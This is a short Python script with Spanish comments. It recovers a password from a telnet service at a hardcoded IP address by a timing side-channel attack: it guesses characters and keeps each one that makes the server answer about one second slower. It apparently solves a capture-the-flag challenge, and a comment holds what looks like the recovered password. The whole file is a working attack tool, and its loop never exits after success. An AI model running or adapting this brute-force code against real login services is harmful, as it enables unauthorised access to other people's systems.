from time import time
import telnetlib

WORDS = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz1234567890'
IP = '143.0.100.198'
PORT = '60123'

# Hay 62 caracteres en total. En el peor de los casos, este programa
# probaría los primeros 61 caracteres, y acertaría en el último (en el 62).
# Dejando así una complejidad de 61*len(password).
# En el mejor de los casos, siempre pegamos a la primera, y adivinamos cual
# es el siguiente caracter de la contraseña, por lo tanto la complejidad sería
# simplemente len(password).

# Y como pasa que cada vez que acertamos un caracter mas de las contraseña,
# el tiempo de espera de respuesta del servidor es 1 segundo mas lento.
# por lo tanto, en el peor de los casos, tendríamos:
# (0.x segundos * 61) + (1.x segundos * 61) + (2.x segundos * 61) + ... + (len(password).x segundos * 61)
# Mientras que en el mejor de los casos, tendríamos: (len(password) * (len(password) + 1)) / 2 segundos
# es decir, (0.x segundos) + (1.x segundos) + (2.x segundos) + ... + (len(password).x segundos)

def tryy(msg):
  start = time()
  tn = telnetlib.Telnet(IP, PORT)
  tn.read_until(b'Password: ')
  tn.write(msg.encode('ascii') + b'\n')
  res = tn.read_all()
  end = time()
  print(f'For {msg} time was {end - start}')
  if res != b'':
    print(res)
    return 'Found'
  return end - start

def get_pwd():
  pwd = '' # 'GaAVCK9r3K'
  while True:
    for w in list(WORDS):
      res = tryy(pwd + w)
      if res == 'Found':
        break
      if res >= len(pwd) + 1:
        pwd += w
  print(f'Found password! {pwd}')

get_pwd()